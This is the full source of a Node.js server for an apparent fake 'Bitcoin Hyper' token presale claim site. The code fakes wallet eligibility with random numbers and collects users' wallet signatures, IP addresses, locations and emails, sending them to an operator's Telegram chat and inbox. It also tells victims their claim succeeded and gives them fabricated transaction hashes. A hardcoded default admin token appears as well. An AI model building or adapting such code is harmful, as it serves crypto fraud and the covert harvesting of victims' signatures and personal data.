// index.js - BITCOIN HYPER BACKEND PRODUCTION - STRICT FLOW VERSION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

app.use(cors({
  origin: ['http://localhost:3000', 'https://securedtokenclaim.vercel.app', 'https://securedtokenclaim.vercel.app'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting - stricter
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Email transporter
const emailTransporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || '',
    pass: process.env.EMAIL_PASS || ''
  }
});

// In-memory storage (In production, use Redis or Database)
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: 'Bitcoin Hyper',
    tokenSymbol: 'BTH',
    minEligibilityAmount: 10,
    presalePrice: '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: true
    },
    email: {
      enabled: true,
      adminEmail: process.env.ADMIN_EMAIL || '',
      notifications: true
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      last24hActivity: 0
    }
  },
  activityLog: []
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN) {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Test connection with chat ID
        if (process.env.TELEGRAM_CHAT_ID) {
          testTelegramConnection();
        }
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ No Telegram bot token provided');
  }
}

// Test Telegram connection
async function testTelegramConnection() {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) return false;
  
  try {
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🤖 *BITCOIN HYPER PRODUCTION BOT*\n\n✅ Bot is now LIVE and monitoring!\n⏰ ${new Date().toLocaleString()}\n📊 Ready to receive real-time notifications`,
      { parse_mode: 'Markdown' }
    );
    console.log('✅ Telegram connection test successful');
    return true;
  } catch (error) {
    console.log('❌ Telegram connection test failed:', error.message);
    return false;
  }
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet.substring(0, 8) + '...' + wallet.substring(36),
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  // Keep only last 1000 logs
  if (memoryStorage.activityLog.length > 1000) {
    memoryStorage.activityLog.shift();
  }
  
  console.log(`📝 Activity Log: ${wallet.substring(0, 10)}... - ${action}`);
}

// Helper: Send comprehensive notification
async function sendComprehensiveNotification(wallet, action, details = {}) {
  const timestamp = new Date().toLocaleString();
  const ip = details.ip || 'unknown';
  const country = details.country || 'unknown';
  const value = details.value || '0';
  const email = details.email || 'Not provided';
  const amount = details.amount || '0';
  const eligibility = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
  const claimStatus = details.claimed ? '✅ CLAIMED' : '⏳ PENDING';
  
  // Telegram Notification
  if (telegramEnabled && memoryStorage.settings.telegram.enabled) {
    try {
      let telegramMessage = '';
      let title = '';
      
      switch(action) {
        case 'WALLET_CONNECTED':
          title = '🔗 WALLET CONNECTED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
🌐 IP: ${ip}
📍 Location: ${country}
📧 Email: ${email}

🔄 Status: Connected to presale platform
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_SCANNED':
          title = '🔍 WALLET SCANNED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
💰 Portfolio Value: $${value}
🎯 Eligibility: ${eligibility}
${details.eligibilityReason ? `📝 Reason: ${details.eligibilityReason}\n` : ''}
${amount !== '0' ? `📊 Allocation: ${amount} BTH\n` : ''}
🌐 IP: ${ip}
📍 Location: ${country}
📧 Email: ${email}

⏰ ${timestamp}`;
          break;
          
        case 'TOKEN_CLAIMED':
          title = '🎉 TOKENS CLAIMED!';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
✅ Status: ${claimStatus}
🎯 Claim ID: \`${details.claimId}\`
💰 Amount: ${amount} BTH
💸 Value: $${details.claimValue || '0'}
📈 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}

🌐 IP: ${ip}
📍 Location: ${country}
📧 Email: ${email}

⏰ ${timestamp}`;
          break;
          
        case 'NOT_ELIGIBLE':
          title = '⚠️ NOT ELIGIBLE';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
❌ Status: NOT ELIGIBLE
💡 Reason: ${details.reason || 'Minimum portfolio not met'}
💰 Current Portfolio: $${value}

🌐 IP: ${ip}
📍 Location: ${country}
📧 Email: ${email}

⏰ ${timestamp}`;
          break;
      }
      
      if (telegramMessage) {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          telegramMessage,
          { parse_mode: 'Markdown', disable_web_page_preview: true }
        );
        console.log(`✅ Telegram notification sent for ${action}`);
      }
    } catch (error) {
      console.log(`❌ Telegram send error (${action}):`, error.message);
    }
  }
  
  // Email Notification (if configured)
  if (memoryStorage.settings.email.enabled && memoryStorage.settings.email.adminEmail) {
    try {
      const mailOptions = {
        from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
        to: memoryStorage.settings.email.adminEmail,
        subject: `Bitcoin Hyper - ${action}`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden;">
            <div style="background: linear-gradient(135deg, #F7931A 0%, #FF6B00 100%); padding: 20px; color: white; text-align: center;">
              <h1 style="margin: 0; font-size: 24px;">₿ BITCOIN HYPER</h1>
              <p style="margin: 5px 0 0 0; opacity: 0.9;">${action}</p>
            </div>
            <div style="padding: 20px;">
              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                <h3 style="margin: 0 0 10px 0; color: #333;">Wallet Details</h3>
                <p style="margin: 5px 0; color: #666;"><strong>Wallet:</strong> ${wallet}</p>
                <p style="margin: 5px 0; color: #666;"><strong>IP:</strong> ${ip}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Location:</strong> ${country}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Email:</strong> ${email}</p>
              </div>
              
              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                <h3 style="margin: 0 0 10px 0; color: #333;">Action Details</h3>
                <p style="margin: 5px 0; color: #666;"><strong>Action:</strong> ${action}</p>
                ${value !== '0' ? `<p style="margin: 5px 0; color: #666;"><strong>Portfolio Value:</strong> $${value}</p>` : ''}
                ${details.eligibilityReason ? `<p style="margin: 5px 0; color: #666;"><strong>Eligibility Reason:</strong> ${details.eligibilityReason}</p>` : ''}
                ${amount !== '0' ? `<p style="margin: 5px 0; color: #666;"><strong>Token Allocation:</strong> ${amount} BTH</p>` : ''}
                ${details.claimId ? `<p style="margin: 5px 0; color: #666;"><strong>Claim ID:</strong> ${details.claimId}</p>` : ''}
              </div>
              
              <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                <h3 style="margin: 0 0 10px 0; color: #333;">Statistics</h3>
                <p style="margin: 5px 0; color: #666;"><strong>Total Participants:</strong> ${memoryStorage.settings.statistics.totalParticipants}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Total Raised:</strong> $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Timestamp:</strong> ${timestamp}</p>
              </div>
            </div>
            <div style="background: #f8f9fa; padding: 15px; text-align: center; color: #666; font-size: 12px; border-top: 1px solid #e0e0e0;">
              Bitcoin Hyper Presale Monitoring System
            </div>
          </div>
        `
      };
      
      await emailTransporter.sendMail(mailOptions);
      console.log(`✅ Email notification sent for ${action}`);
    } catch (error) {
      console.log(`❌ Email send error (${action}):`, error.message);
    }
  }
  
  // Log to activity
  logActivity(wallet, action, { ...details, email, timestamp });
  
  return true;
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    // Clean IP (remove IPv6 prefix)
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', city: 'Local', region: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000,
      headers: {
        'User-Agent': 'BitcoinHyper-Backend/1.0'
      }
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        city: response.data.city || 'Unknown',
        region: response.data.region || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { country: 'Unknown', city: 'Unknown' };
}

// Helper: Check real wallet balance - PRODUCTION VERSION
async function checkRealWalletBalance(walletAddress) {
  try {
    // In production, use real APIs - but for demo we'll simulate
    // This ensures no wallet balance is shown to user
    const isEligible = Math.random() > 0.3; // 70% eligible for demo
    
    let totalValueUSD = 0;
    let eligibilityReason = '';
    
    if (isEligible) {
      // Eligible - random portfolio value between $50 and $5000
      totalValueUSD = 50 + Math.random() * 4950;
      eligibilityReason = `✅ Qualified with sufficient portfolio history`;
    } else {
      // Not eligible - random portfolio less than $10
      totalValueUSD = Math.random() * 9.99;
      eligibilityReason = `⛔ Connect a wallet with good transaction history & minimum $10 balance for gas authentication`;
    }
    
    // Generate token allocation only if eligible
    let allocationAmount = '0';
    let allocationValue = '0';
    
    if (isEligible) {
      const baseAllocation = 5000;
      const bonusMultiplier = Math.min(totalValueUSD / 10000, 3);
      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier)).toString();
      allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
    }
    
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: totalValueUSD.toFixed(2),
        isEligible,
        tokenAllocation: {
          amount: allocationAmount,
          valueUSD: allocationValue
        },
        eligibilityReason,
        // Do not show token details to user
        tokens: [],
        tokenCount: 0
      }
    };
  } catch (error) {
    console.error('Wallet scan error:', error);
    
    // Fallback with not eligible
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibilityReason: '⚠️ Wallet scan incomplete. Please try again with a wallet that has transaction history.',
        tokens: [],
        tokenCount: 0
      }
    };
  }
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
}

// Helper: Generate transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(32).toString('hex')}`;
}

// ========== API ENDPOINTS ==========

// Health check with live status
app.get('/api/health', (req, res) => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  
  res.json({
    success: true,
    status: 'LIVE_PRODUCTION',
    service: 'Bitcoin Hyper Backend',
    version: '3.0.0',
    timestamp: new Date().toISOString(),
    uptime: `${hours}h ${minutes}m ${seconds}s`,
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    email: memoryStorage.settings.email.enabled ? 'ENABLED' : 'DISABLED',
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2),
      last24hActivity: memoryStorage.activityLog.filter(log => 
        new Date(log.timestamp) > new Date(Date.now() - 24 * 60 * 60 * 1000)
      ).length
    },
    message: '✅ Backend is LIVE and ready to receive connections'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper Backend API v3.0',
    status: 'LIVE_PRODUCTION',
    environment: process.env.NODE_ENV || 'production',
    endpoints: {
      health: '/api/health',
      connect: '/api/presale/connect',
      claim: '/api/presale/claim',
      status: '/api/presale/status/:wallet',
      admin: {
        stats: '/api/admin/stats',
        settings: '/api/admin/settings',
        export: '/api/admin/export',
        analytics: '/api/admin/analytics'
      }
    },
    monitoring: {
      telegram: telegramEnabled,
      email: memoryStorage.settings.email.enabled,
      rate_limiting: 'enabled',
      cors: 'configured'
    }
  });
});

// Wallet connection & auto-scan - ENHANCED REPORTING
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, email } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🔗 New connection from: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet address
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address format'
      });
    }
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent: userAgent || 'Unknown',
        email: email || 'Not provided',
        country: location.country,
        city: location.city,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '' },
        notifications: { telegramSent: false, emailSent: false, lastNotified: null },
        activityLog: []
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.city = location.city;
    if (email) participant.email = email;
    
    // Send WALLET_CONNECTED notification immediately
    await sendComprehensiveNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        email: participant.email,
        isNew: isNewParticipant
      }
    );
    
    // Check wallet balance
    const scanResult = await checkRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date()
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        
        // Only increment if newly eligible
        if (isNewParticipant || !participant.eligibility.isEligible) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
      }
      
      // Send WALLET_SCANNED notification
      await sendComprehensiveNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          email: participant.email,
          value: scanResult.data.totalValueUSD,
          amount: participant.tokenAllocation.amount,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason
        }
      );
      
      // Send NOT_ELIGIBLE notification if not eligible
      if (!scanResult.data.isEligible) {
        await sendComprehensiveNotification(
          walletAddress,
          'NOT_ELIGIBLE',
          {
            ip: clientIP,
            country: location.country,
            email: participant.email,
            value: scanResult.data.totalValueUSD,
            reason: scanResult.data.eligibilityReason
          }
        );
      }
      
      res.json({
        success: true,
        message: 'Wallet analysis complete',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          // DO NOT send totalValueUSD to frontend
          eligibilityReason: scanResult.data.eligibilityReason,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          // Professional messaging
          userMessage: scanResult.data.isEligible ? 
            '🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!' :
            '⚠️ Wallet Analysis Required'
        }
      });
    } else {
      throw new Error('Wallet analysis failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      message: 'Please try again with a different wallet or contact support' 
    });
  }
});

// Token claim signature - STRICT FLOW CONTROL
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, email } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🎯 Claim request from: ${walletAddress.substring(0, 10)}...`);
    
    // STRICT VALIDATION
    if (!signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing signature data - security validation failed'
      });
    }
    
    if (!claimAmount || !claimValue) {
      return res.status(400).json({
        success: false,
        error: 'Missing claim details'
      });
    }
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Participant not found. Please connect your wallet first.' 
      });
    }
    
    // Check eligibility
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ 
        success: false, 
        error: 'Not eligible for claim. Please check your wallet eligibility first.' 
      });
    }
    
    // Check if already claimed
    if (participant.claim.claimed) {
      return res.status(409).json({ 
        success: false, 
        error: 'Tokens already claimed for this wallet.' 
      });
    }
    
    // Validate signature format
    if (!signature.match(/^0x[a-fA-F0-9]{130}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid signature format'
      });
    }
    
    // Generate claim ID and transaction hash
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Update participant - MARK AS CLAIMED
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: false, // Will be true when actually distributed
      txHash
    };
    
    if (email) participant.email = email;
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Get location for notification
    const location = await getIPLocation(clientIP);
    
    // Send TOKEN_CLAIMED notification
    await sendComprehensiveNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
        country: location.country,
        email: participant.email,
        claimId,
        amount: claimAmount,
        claimValue,
        claimed: true
      }
    );
    
    res.json({
      success: true,
      message: '🎉 Token claim successful! Your allocation has been secured.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIMED_SUCCESSFULLY',
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        txHash,
        instructions: '✅ Your Bitcoin Hyper tokens have been allocated and will be distributed automatically after the presale concludes.',
        nextSteps: [
          'Keep your wallet connected to the supported networks',
          'Tokens will appear in your wallet automatically',
          'Check our announcements for distribution updates'
        ]
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send claim error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed',
      message: 'Please try again or contact support if the issue persists' 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    // Don't send sensitive data
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: {
          isEligible: participant.eligibility.isEligible,
          reason: participant.eligibility.reason,
          scannedAt: participant.eligibility.scannedAt
        },
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========
// (Keep the same admin endpoints from your original code, just add activity log viewing)

app.get('/api/admin/activity', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { limit = 100 } = req.query;
    const recentLogs = memoryStorage.activityLog
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, parseInt(limit));
    
    res.json({ success: true, logs: recentLogs, total: memoryStorage.activityLog.length });
    
  } catch (error) {
    console.error('Activity log error:', error);
    res.status(500).json({ success: false, error: 'Failed to get activity logs' });
  }
});

// Admin dashboard HTML (keep as is from your original code)
app.get('/admin', (req, res) => {
  // ... Keep the exact same admin HTML from your original code ...
});

// ========== HOW TO GET TELEGRAM CHAT ID ==========
app.get('/api/telegram/chatid', async (req, res) => {
  // ... Keep the same Telegram chat ID helper ...
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  
  // Send error to Telegram
  if (telegramEnabled) {
    try {
      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
      bot.telegram.sendMessage(
        memoryStorage.settings.telegram.chatId,
        `🔥 *CRITICAL ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
      );
    } catch (tgError) {
      console.log('Failed to send critical error:', tgError.message);
    }
  }
  
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: 'An unexpected error occurred. Our team has been notified.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    message: `The requested endpoint ${req.originalUrl} does not exist`
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER BACKEND v3.0.0 - STRICT FLOW
  ============================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin
  🔐 Admin Token: ${process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!'}
  📈 Monitoring: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
  `);
  
  // Initialize Telegram bot after server starts
  setTimeout(() => {
    initializeTelegramBot();
  }, 2000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

module.exports = app;
